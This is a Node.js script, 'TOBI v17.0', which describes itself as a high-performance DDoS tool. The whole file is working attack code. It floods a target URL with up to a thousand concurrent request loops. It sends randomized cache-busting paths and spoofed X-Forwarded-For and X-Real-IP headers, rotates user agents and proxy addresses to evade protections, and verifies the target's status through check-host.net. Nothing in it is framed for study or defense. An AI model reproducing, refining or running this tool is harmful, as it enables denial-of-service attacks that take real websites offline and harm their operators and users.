#!/usr/bin/env node

/**
 * TOBI v17.0 – Fixed & Optimized DDoS Tool
 * - Proper proxy support with rotation
 * - High-performance async workers
 * - Real-time stats with peak RPS
 * - Bypasses common protections (random paths, headers, IP spoofing)
 */

const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const fs = require('fs');
const readline = require('readline');
const crypto = require('crypto');
const http = require('http');
const https = require('https');

// Colors
const c = {
    red: '\x1b[91m', green: '\x1b[92m', yellow: '\x1b[93m',
    cyan: '\x1b[96m', bold: '\x1b[1m', reset: '\x1b[0m', clear: '\x1b[2J\x1b[H', dim: '\x1b[2m'
};

// ==================== CONFIG ====================
let target = null;
let duration = 60;
let workers = 1000;
let proxyFile = null;
let stop = false;

// ==================== PROXY LOADER ====================
let proxies = [];
let proxyIndex = 0;

function loadProxies() {
    if (!proxyFile) return;
    try {
        const content = fs.readFileSync(proxyFile, 'utf8');
        proxies = content.split('\n').filter(l => {
            l = l.trim();
            return l && !l.startsWith('#') && l.includes(':');
        }).map(l => {
            // Ensure protocol
            if (!l.startsWith('http')) return 'http://' + l;
            return l;
        });
        console.log(`${c.green}[✓] Loaded ${proxies.length} proxies${c.reset}`);
        // Shuffle
        for (let i = proxies.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [proxies[i], proxies[j]] = [proxies[j], proxies[i]];
        }
    } catch(e) {
        console.log(`${c.yellow}[!] No proxy file – running without proxies${c.reset}`);
    }
}

function getProxyAgent() {
    if (proxies.length === 0) return null;
    const proxy = proxies[proxyIndex % proxies.length];
    proxyIndex++;
    try {
        return new HttpsProxyAgent(proxy);
    } catch(e) {
        return null;
    }
}

// ==================== UTILITIES ====================
function randomString(len) {
    return crypto.randomBytes(len).toString('hex');
}

function spoofIP() {
    return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*254)}`;
}

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0'
];

// Custom HTTPS agent that ignores SSL errors
const httpsAgent = new https.Agent({ rejectUnauthorized: false, keepAlive: true });
const httpAgent = new http.Agent({ keepAlive: true });

// ==================== REQUEST FUNCTION ====================
async function sendRequest() {
    // Random path with query parameters to avoid caching
    const path = `/${randomString(12)}?${randomString(8)}=${randomString(6)}&_=${Date.now()}`;
    const fullUrl = target + path;
    const headers = {
        'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'X-Forwarded-For': spoofIP(),
        'X-Real-IP': spoofIP(),
        'Referer': 'https://www.google.com/',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
    };
    const proxyAgent = getProxyAgent();
    const requestConfig = {
        headers,
        timeout: 5000,
        validateStatus: () => true, // Accept any status
        httpsAgent: httpsAgent,
        httpAgent: httpAgent,
        maxRedirects: 0,
        decompress: false
    };
    if (proxyAgent) requestConfig.httpsAgent = proxyAgent;
    try {
        const response = await axios.get(fullUrl, requestConfig);
        return response.status >= 200 && response.status < 500; // Consider 4xx as "success" for resource consumption
    } catch(e) {
        return false;
    }
}

// ==================== STATISTICS ====================
let stats = {
    total: 0, success: 0, failed: 0,
    startTime: null, lastSec: 0, lastSecCount: 0, peakRps: 0
};

function record(success) {
    stats.total++;
    if (success) stats.success++;
    else stats.failed++;
    const now = Date.now() / 1000;
    if (now - stats.lastSec >= 1) {
        if (stats.lastSecCount > stats.peakRps) stats.peakRps = stats.lastSecCount;
        stats.lastSecCount = 0;
        stats.lastSec = now;
    }
    stats.lastSecCount++;
}

function displayStats() {
    const elapsed = (Date.now() - stats.startTime) / 1000;
    const rps = stats.total / Math.max(elapsed, 0.1);
    const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
    process.stdout.write(`\r${c.cyan}RPS: ${c.bold}${rps.toFixed(1)}${c.reset} | ` +
        `${c.green}✓ ${stats.success.toLocaleString()}${c.reset} | ` +
        `${c.red}✗ ${stats.failed.toLocaleString()}${c.reset} | ` +
        `${c.yellow}${successRate.toFixed(1)}%${c.reset} | ` +
        `${c.dim}${elapsed.toFixed(0)}s${c.reset} | ` +
        `${c.magenta}Peak: ${stats.peakRps} RPS${c.reset}`);
}

// ==================== WORKER LOOP ====================
async function worker() {
    while (!stop) {
        const success = await sendRequest();
        record(success);
        // Yield every 10 requests to keep event loop responsive
        if (stats.total % 10 === 0) await new Promise(resolve => setImmediate(resolve));
    }
}

// ==================== CHECK-HOST.NET ====================
function checkHost(target) {
    return new Promise((resolve) => {
        let cleanTarget = target;
        if (!cleanTarget.startsWith('http')) cleanTarget = 'https://' + cleanTarget;
        const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(cleanTarget)}`;
        console.log(`${c.cyan}[*] Checking ${cleanTarget} via check-host.net...${c.reset}`);
        const req = https.get(checkUrl, { rejectUnauthorized: false }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const json = JSON.parse(data);
                    console.log(`${c.green}[✓] Report: https://check-host.net/check-report/${json.request_id}${c.reset}`);
                    resolve(json);
                } catch(e) { resolve(null); }
            });
        });
        req.on('error', () => resolve(null));
        req.setTimeout(10000, () => { req.destroy(); resolve(null); });
    });
}

// ==================== MAIN ====================
async function start() {
    // Normalize target URL
    let fullTarget = target;
    if (!fullTarget.startsWith('http')) fullTarget = 'https://' + fullTarget;
    // Remove trailing slash
    if (fullTarget.endsWith('/')) fullTarget = fullTarget.slice(0, -1);
    target = fullTarget;

    console.log(c.clear);
    console.log(`${c.red}${c.bold}
╔══════════════════════════════════════════════════════════════════════════╗
║                 🔥 TOBI v17.0 – FIXED & OPTIMIZED 🔥                    ║
║            High-performance DDoS | Proxy Rotation | Real Stats          ║
╚══════════════════════════════════════════════════════════════════════════╝${c.reset}`);
    console.log(`\n${c.green}[✓] Target: ${target}`);
    console.log(`[✓] Duration: ${duration}s`);
    console.log(`[✓] Workers: ${workers.toLocaleString()}`);
    if (proxyFile) loadProxies();
    console.log(`${c.reset}\n`);

    await checkHost(target);

    stats.startTime = Date.now();
    stats.lastSec = stats.startTime / 1000;

    console.log(`${c.yellow}[!] Launching ${workers} workers...${c.reset}`);
    const workerPromises = [];
    for (let i = 0; i < workers; i++) {
        workerPromises.push(worker());
    }
    console.log(`${c.green}[✓] All workers launched!${c.reset}\n`);

    const interval = setInterval(displayStats, 1000);

    setTimeout(() => {
        stop = true;
    }, duration * 1000);

    process.on('SIGINT', () => {
        console.log(`\n${c.yellow}[!] Shutting down...${c.reset}`);
        stop = true;
        setTimeout(() => {
            clearInterval(interval);
            const elapsed = (Date.now() - stats.startTime) / 1000;
            const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
            console.log(`\n${c.magenta}${c.bold}════════════════════════════════════════════════════════════════`);
            console.log(`                    FINAL REPORT`);
            console.log(`════════════════════════════════════════════════════════════════${c.reset}`);
            console.log(`  Total Requests:  ${stats.total.toLocaleString()}`);
            console.log(`  Successful:      ${stats.success.toLocaleString()}`);
            console.log(`  Failed:          ${stats.failed.toLocaleString()}`);
            console.log(`  Success Rate:    ${successRate.toFixed(2)}%`);
            console.log(`  Peak RPS:        ${stats.peakRps}`);
            console.log(`  Duration:        ${elapsed.toFixed(1)}s`);
            console.log(`${c.magenta}════════════════════════════════════════════════════════════════${c.reset}`);
            process.exit(0);
        }, 500);
    });
}

// ==================== ENTRY POINT ====================
(async () => {
    if (process.argv[2]) {
        target = process.argv[2];
        duration = parseInt(process.argv[3]) || 60;
        workers = parseInt(process.argv[4]) || 1000;
        proxyFile = process.argv[5] || null;
        start();
    } else {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        target = await new Promise(resolve => rl.question(`${c.cyan}🌐 Target URL: ${c.reset}`, resolve));
        duration = parseInt(await new Promise(resolve => rl.question(`${c.cyan}⏱️  Duration (seconds): ${c.reset}`, resolve))) || 60;
        workers = parseInt(await new Promise(resolve => rl.question(`${c.cyan}👥 Workers: ${c.reset}`, resolve))) || 1000;
        const useProxy = await new Promise(resolve => rl.question(`${c.cyan}🔄 Use proxy file? (y/n): ${c.reset}`, resolve));
        if (useProxy.toLowerCase() === 'y') {
            proxyFile = await new Promise(resolve => rl.question(`${c.cyan}📁 Proxy file path: ${c.reset}`, resolve)) || 'proxy.txt';
        }
        rl.close();
        start();
    }
})();
